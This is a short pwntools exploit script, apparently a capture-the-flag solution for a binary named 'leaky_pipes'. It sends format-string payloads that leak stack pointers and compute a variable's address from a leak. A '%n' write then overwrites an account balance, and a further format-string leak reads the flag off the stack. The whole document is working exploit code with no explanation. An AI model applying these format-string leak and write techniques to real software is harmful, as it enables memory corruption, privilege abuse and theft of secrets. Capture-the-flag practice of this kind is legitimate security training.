from pwn import *

context.arch = 'x86_64'
p = process('./leaky_pipes', level="debug")

#host = os.environ['CI_REGISTRY_IMAGE'].replace('/', '-')
#p = remote(host, 4005)

gdb.attach(p, gdbscript='b*check_leaks+88\nc\n')

p.recv()
p.sendline('1')
pay = 'aaaaaaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p'
p.sendline(pay)

s = p.recv()
print(s)

p.sendline('1')
pay = 'b'*8 + ' %18$p'
p.sendline(pay)

p.recvuntil('bbbbbbbb ')
leak = p.recvline()[:-1]

bal = int(leak, 16) + 0x2ab0
info("bal: %s", hex(bal))

p.sendline('1')

pay = '%{}p'.format(200-7)
pay += 'c'*7
pay += '%8$n'
pay += p64(bal)
pay += p64(0)
p.sendline(pay)

p.recv()
p.sendline('2')

p.recv()
p.sendline('3')
p.sendline('%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p')

p.recvuntil("Please give us your feedback!\n")
s = p.recvline()[:-1].split(' ')
flag = ''
for i in s:
	flag += p64(int(i, 16))
info("flag: %s"%flag[:-2])
#p.interactive()
